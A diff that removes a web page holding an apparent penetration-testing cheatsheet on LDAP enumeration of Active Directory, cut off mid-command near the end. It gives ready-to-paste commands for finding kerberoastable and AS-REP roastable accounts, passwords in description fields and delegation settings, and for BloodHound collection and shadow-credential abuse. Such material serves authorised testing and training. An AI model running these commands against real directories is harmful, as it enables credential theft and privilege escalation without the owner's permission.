@@ -1,483 +1,88 @@
-<!DOCTYPE html>
-<html lang="en-US" dir="ltr" class="">
-<head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>LDAP | JinPwn</title><meta name="description" content="LDAP enum against Active Directory and standalone directories. AD-specific attacks (kerberoast, ASREP, ACL abuse) live in 00 AD MOC .">
-<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-
-<link rel="canonical" href="https://jinpwn.dev/cheatsheets/misc/ldap/">
-<meta property="og:title" content="LDAP | JinPwn">
-<meta property="og:description" content="LDAP enum against Active Directory and standalone directories. AD-specific attacks (kerberoast, ASREP, ACL abuse) live in 00 AD MOC .">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://jinpwn.dev/cheatsheets/misc/ldap/">
-<meta property="og:site_name" content="JinPwn">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="LDAP | JinPwn">
-<meta name="twitter:description" content="LDAP enum against Active Directory and standalone directories. AD-specific attacks (kerberoast, ASREP, ACL abuse) live in 00 AD MOC .">
-<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:site" content="@jinpwn">
-<meta name="twitter:creator" content="@jinpwn">
-
-
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"LDAP enum against Active Directory and standalone directories. AD-specific attacks (kerberoast, ASREP, ACL abuse) live in 00 AD MOC .","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"LDAP | JinPwn","url":"https://jinpwn.dev/cheatsheets/misc/ldap/"}</script>
-
-<meta name="theme-color" content="#111111">
-<link rel="icon" type="image/png" href="/favicon.png">
-
-      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
-
-
-        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
-        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
-
-
-</head>
-<body class="">
-  
-
-
-
-
-
-  
-  
-  
-
-
-
-  
-
-<header class="site-header">
-  <nav class="top-nav">
-    <div class="container nav-inner">
-      <div class="nav-left">
-        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
-        <div class="nav-links desktop-only">
-          
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-        </div>
-      </div>
-      <div class="nav-actions">
-        <div class="search-anchor" id="search-root" data-search-root>
-          <label class="search-trigger" for="search-input">
-            <span class="search-glyph" aria-hidden="true">
-              <svg viewBox="0 0 24 24">
-                <circle cx="11" cy="11" r="7"></circle>
-                <path d="M20 20L16.65 16.65"></path>
-              </svg>
-            </span>
-            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
-            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
-              <svg viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M18 6L6 18"></path>
-                <path d="M6 6l12 12"></path>
-              </svg>
-            </button>
-            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
-          </label>
-          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
-  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
-  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
-    <p class="search-empty">Type to search posts and cheatsheets.</p>
-  </div>
-</div>
-
-        </div>
-        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <circle cx="11" cy="11" r="7"></circle>
-            <path d="M20 20L16.65 16.65"></path>
-          </svg>
-        </button>
-        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
-            <path d="M3 6h18"></path>
-            <path d="M3 12h18"></path>
-            <path d="M3 18h18"></path>
-          </svg>
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
-            <path d="M18 6L6 18"></path>
-            <path d="M6 6l12 12"></path>
-          </svg>
-        </button>
-      </div>
-    </div>
-    <div id="mobile-nav" class="mobile-nav">
-      
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-    </div>
-  </nav>
-</header>
-
-  
-  <main class="site-main">
-    
-  
-  
-  
-  <article class="container cheatsheet-docs-shell">
-    <div class="cheatsheet-docs-layout">
-      
-        <aside class="cheatsheet-sidebar" aria-label="Misc navigation">
-    <div class="cheatsheet-sidebar-inner">
-      
-        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
-      
-      <a href="/cheatsheets/misc/" class="cheatsheet-sidebar-section">Misc</a>
-      
-        <nav class="cheatsheet-sidebar-nav">
-          <ul class="cheatsheet-sidebar-list">
-            
-              <li>
-                <a href="/cheatsheets/misc/00-tooling-moc/" class="cheatsheet-sidebar-link">Tooling MOC</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/misc/file-transfer/" class="cheatsheet-sidebar-link">File Transfer</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/misc/ldap/" class="cheatsheet-sidebar-link is-current">LDAP</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/misc/password-cracking/" class="cheatsheet-sidebar-link">Password Cracking</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/misc/pivoting/" class="cheatsheet-sidebar-link">Pivoting</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/misc/recon-external/" class="cheatsheet-sidebar-link">Recon (external)</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/misc/reverse-shells/" class="cheatsheet-sidebar-link">Reverse Shells</a>
-              </li>
-            
-          </ul>
-        </nav>
-      
-    </div>
-  </aside>
-      
-      <div class="cheatsheet-docs-main cheatsheet-page-main">
-        <header class="cheatsheet-page-header">
-          <h1>LDAP</h1>
-          
-        </header>
-
-        
-          <details class="cheatsheet-mobile-sections">
-    <summary class="cheatsheet-mobile-sections-summary">
-      <span class="cheatsheet-mobile-sections-label">Sections</span>
-      <span class="cheatsheet-mobile-sections-current">LDAP</span>
-      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
-    </summary>
-    <div class="cheatsheet-mobile-sections-panel">
-      <nav aria-label="Misc sections">
-        <ul class="cheatsheet-mobile-sections-list">
-          
-            <li>
-              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
-            </li>
-          
-          <li>
-            <a href="/cheatsheets/misc/" class="cheatsheet-mobile-sections-link">Overview</a>
-          </li>
-          
-            <li>
-              <a href="/cheatsheets/misc/00-tooling-moc/" class="cheatsheet-mobile-sections-link">Tooling MOC</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/misc/file-transfer/" class="cheatsheet-mobile-sections-link">File Transfer</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/misc/ldap/" class="cheatsheet-mobile-sections-link is-current">LDAP</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/misc/password-cracking/" class="cheatsheet-mobile-sections-link">Password Cracking</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/misc/pivoting/" class="cheatsheet-mobile-sections-link">Pivoting</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/misc/recon-external/" class="cheatsheet-mobile-sections-link">Recon (external)</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/misc/reverse-shells/" class="cheatsheet-mobile-sections-link">Reverse Shells</a>
-            </li>
-          
-        </ul>
-      </nav>
-    </div>
-  </details>
-        
-
-        <div class="markdown-content cheatsheet-page-body">
-          <p>LDAP enum against Active Directory and standalone directories. AD-specific attacks (kerberoast, ASREP, ACL abuse) live in <a href="https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/">00 AD MOC</a>
-.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">DC</span><span class="o">=</span>10.10.11.50
-</span></span><span class="line"><span class="cl"><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
-</span></span><span class="line"><span class="cl"><span class="nv">BASE</span><span class="o">=</span><span class="s1">&#39;DC=corp,DC=local&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">USER</span><span class="o">=</span><span class="s1">&#39;svc_user&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password1&#39;</span>
-</span></span></code></pre></div><h2 id="i-anonymous-bind" data-heading-permalink="true"><span class="heading-content">i. Anonymous bind</span>
-    <a class="heading-permalink" href="#i-anonymous-bind" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Lot of misconfigured DCs allow anonymous read. Always try first.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> -s base namingcontexts
-</span></span><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> -b <span class="s2">&#34;</span><span class="nv">$BASE</span><span class="s2">&#34;</span>
-</span></span></code></pre></div><p>What to grep for in anonymous output:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> -b <span class="s2">&#34;</span><span class="nv">$BASE</span><span class="s2">&#34;</span> <span class="p">|</span> grep -iE <span class="s1">&#39;description|userpassword|info|comment&#39;</span>
-</span></span></code></pre></div><h2 id="ii-authenticated-bind" data-heading-permalink="true"><span class="heading-content">ii. Authenticated bind</span>
-    <a class="heading-permalink" href="#ii-authenticated-bind" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> -D <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -w <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -b <span class="s2">&#34;</span><span class="nv">$BASE</span><span class="s2">&#34;</span>
-</span></span></code></pre></div><p>Over LDAPS (encrypted, needed for password changes and some attacks):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldaps://<span class="nv">$DC</span> -D <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -w <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -b <span class="s2">&#34;</span><span class="nv">$BASE</span><span class="s2">&#34;</span>
-</span></span></code></pre></div><p>GSSAPI / Kerberos auth (no password on the command line):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kinit <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">@</span><span class="si">${</span><span class="nv">DOMAIN</span><span class="p">^^</span><span class="si">}</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">ldapsearch -Y GSSAPI -H ldap://<span class="nv">$DC</span> -b <span class="s2">&#34;</span><span class="nv">$BASE</span><span class="s2">&#34;</span>
-</span></span></code></pre></div><h2 id="iii-useful-filters-copy-paste" data-heading-permalink="true"><span class="heading-content">iii. Useful filters, copy-paste</span>
-    <a class="heading-permalink" href="#iii-useful-filters-copy-paste" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Replace the filter after <code>-b &quot;$BASE&quot;</code> to target specific objects.</p>
-<p>All users:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> -D <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -w <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -b <span class="s2">&#34;</span><span class="nv">$BASE</span><span class="s2">&#34;</span> <span class="s1">&#39;(&amp;(objectClass=user)(objectCategory=person))&#39;</span> samaccountname description
-</span></span></code></pre></div><p>All computers:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> -D <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -w <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -b <span class="s2">&#34;</span><span class="nv">$BASE</span><span class="s2">&#34;</span> <span class="s1">&#39;(objectClass=computer)&#39;</span> dnshostname operatingsystem
-</span></span></code></pre></div><p>Domain admins:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> -D <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -w <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -b <span class="s2">&#34;</span><span class="nv">$BASE</span><span class="s2">&#34;</span> <span class="s1">&#39;(&amp;(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))&#39;</span> samaccountname
-</span></span></code></pre></div><p>Kerberoastable accounts (users with SPN):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> -D <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -w <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -b <span class="s2">&#34;</span><span class="nv">$BASE</span><span class="s2">&#34;</span> <span class="s1">&#39;(&amp;(objectClass=user)(servicePrincipalName=*))&#39;</span> samaccountname serviceprincipalname
-</span></span></code></pre></div><p>AS-REP roastable (PreAuth not required):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> -D <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -w <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -b <span class="s2">&#34;</span><span class="nv">$BASE</span><span class="s2">&#34;</span> <span class="s1">&#39;(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&#39;</span> samaccountname
-</span></span></code></pre></div><p>Passwords in description field (classic mistake):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> -D <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -w <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -b <span class="s2">&#34;</span><span class="nv">$BASE</span><span class="s2">&#34;</span> <span class="s1">&#39;(description=*)&#39;</span> samaccountname description <span class="p">|</span> grep -iE <span class="s1">&#39;samaccount|descr&#39;</span>
-</span></span></code></pre></div><p>Constrained / Unconstrained delegation:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Unconstrained</span>
-</span></span><span class="line"><span class="cl">ldapsearch ... <span class="s1">&#39;(userAccountControl:1.2.840.113556.1.4.803:=524288)&#39;</span> samaccountname
-</span></span><span class="line"><span class="cl"><span class="c1">## Constrained (any account with msDS-AllowedToDelegateTo)</span>
-</span></span><span class="line"><span class="cl">ldapsearch ... <span class="s1">&#39;(msDS-AllowedToDelegateTo=*)&#39;</span> samaccountname msDS-AllowedToDelegateTo
-</span></span></code></pre></div><p>GPO objects, often have passwords in old groups.xml:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch ... <span class="s1">&#39;(objectClass=groupPolicyContainer)&#39;</span> displayname gpcfilesyspath
-</span></span></code></pre></div><h2 id="iv-useraccountcontrol-decoder" data-heading-permalink="true"><span class="heading-content">iv. UserAccountControl decoder</span>
-    <a class="heading-permalink" href="#iv-useraccountcontrol-decoder" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Common UAC bit flags you see in queries:</p>
-<table>
-  <thead>
-      <tr>
-          <th>Decimal</th>
-          <th>Hex</th>
-          <th>Meaning</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>512</td>
-          <td>0x200</td>
-          <td>Normal account</td>
-      </tr>
-      <tr>
-          <td>514</td>
-          <td>0x202</td>
-          <td>Disabled account</td>
-      </tr>
-      <tr>
-          <td>528</td>
-          <td>0x210</td>
-          <td>Locked</td>
-      </tr>
-      <tr>
-          <td>2048</td>
-          <td>0x800</td>
-          <td>InterDomain trust</td>
-      </tr>
-      <tr>
-          <td>4096</td>
-          <td>0x1000</td>
-          <td>Workstation trust</td>
-      </tr>
-      <tr>
-          <td>8192</td>
-          <td>0x2000</td>
-          <td>DC account</td>
-      </tr>
-      <tr>
-          <td>66048</td>
-          <td>0x10200</td>
-          <td>Password never expires</td>
-      </tr>
-      <tr>
-          <td>4194304</td>
-          <td>0x400000</td>
-          <td>No PreAuth required (ASREP-roastable)</td>
-      </tr>
-      <tr>
-          <td>524288</td>
-          <td>0x80000</td>
-          <td>Trusted for unconstrained delegation</td>
-      </tr>
-      <tr>
-          <td>16777216</td>
-          <td>0x1000000</td>
-          <td>Trusted to auth for delegation</td>
-      </tr>
-  </tbody>
-</table>
-<p>Filter syntax for bit-test: <code>(userAccountControl:1.2.840.113556.1.4.803:=FLAG)</code>.</p>
-<h2 id="v-bulk-enum-tools" data-heading-permalink="true"><span class="heading-content">v. Bulk enum tools</span>
-    <a class="heading-permalink" href="#v-bulk-enum-tools" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>nxc LDAP, fastest for one-shot enum:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> --users
-</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> --groups
-</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> --asreproast asrep.out
-</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> --kerberoasting krb.out
-</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> --trusted-for-delegation
-</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> --password-not-required
-</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> --admin-count
-</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> --get-desc-users
-</span></span></code></pre></div><p>windapsearch, more verbose dumps:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">windapsearch --dc-ip <span class="nv">$DC</span> -d <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> --da
-</span></span><span class="line"><span class="cl">windapsearch --dc-ip <span class="nv">$DC</span> -d <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> --privileged-users
-</span></span><span class="line"><span class="cl">windapsearch --dc-ip <span class="nv">$DC</span> -d <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> --computers
-</span></span></code></pre></div><p>ldapdomaindump, HTML report with everything:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapdomaindump <span class="nv">$DC</span> -u <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Outputs: domain_users.html, domain_computers.html, domain_groups.html</span>
-</span></span></code></pre></div><h2 id="vi-bloodhound-ingest" data-heading-permalink="true"><span class="heading-content">vi. BloodHound ingest</span>
-    <a class="heading-permalink" href="#vi-bloodhound-ingest" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Primary collector, rusthound-ce, fast and accurate for most edges:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rusthound-ce -d <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -i <span class="nv">$DC</span> --zip
-</span></span><span class="line"><span class="cl"><span class="c1">## Output: 20XX-XX-XX-corp.local-rusthound.zip</span>
-</span></span></code></pre></div><p>Over a SOCKS pivot:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains -q rusthound-ce -d <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -i <span class="nv">$DC</span> --zip
-</span></span></code></pre></div><div class="obsidian-callout callout-warning">
-  <div class="obsidian-callout-header">
-    <div class="obsidian-callout-icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
-          <path d="M12 9v4"></path>
-          <path d="M12 17h.01"></path></svg>
-    </div>
-    <span class="obsidian-callout-title">Missing outbound object control</span>
-  </div>
-  <div class="obsidian-callout-body">
-    <p>rusthound-ce sometimes misses certain outbound ACL edges (WriteOwner, GenericAll on objects outside the user&rsquo;s OU, etc). When BloodHound looks too clean, run bloodyAD too.</p>
-  </div>
-</div>
-<p>Fallback / supplement, bloodyAD, exports a BloodHound-compatible zip:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD --host <span class="nv">$DC</span> -d <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> get bloodhound --output bh-bloody.zip
-</span></span></code></pre></div><p>Through pivot:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains -q bloodyAD --host <span class="nv">$DC</span> -d <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> get bloodhound --output bh-bloody.zip
-</span></span></code></pre></div><div class="obsidian-callout callout-tip">
-  <div class="obsidian-callout-header">
-    <div class="obsidian-callout-icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path></svg>
-    </div>
-    <span class="obsidian-callout-title">Upload both</span>
-  </div>
-  <div class="obsidian-callout-body">
-    <p>When in doubt, run both tools and drop both zips into BloodHound. The graph merges and you get the union of edges. Catches the ACLs rusthound-ce silently skipped.</p>
-  </div>
-</div>
-<h2 id="vii-modify-objects-write-level-access" data-heading-permalink="true"><span class="heading-content">vii. Modify objects (write-level access)</span>
-    <a class="heading-permalink" href="#vii-modify-objects-write-level-access" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>If BloodHound shows you have write rights to an object, abuse with:</p>
-<p>ldapmodify, raw:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapmodify -x -H ldaps://<span class="nv">$DC</span> -D <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -w <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> <span class="s">&lt;&lt;EOF
-</span></span></span><span class="line"><span class="cl"><span class="s">dn: CN=target,CN=Users,$BASE
-</span></span></span><span class="line"><span class="cl"><span class="s">changetype: modify
-</span></span></span><span class="line"><span class="cl"><span class="s">replace: servicePrincipalName
-</span></span></span><span class="line"><span class="cl"><span class="s">servicePrincipalName: cifs/anything
-</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
-</span></span></code></pre></div><p>Targeted Kerberoast (set SPN, roast, remove SPN):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">targetedKerberoast.py -d <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> --dc-ip <span class="nv">$DC</span>
-</span></span></code></pre></div><p>Shadow Credentials (msDS-KeyCredentialLink, if you have write rights):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy shadow auto -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -account targetuser
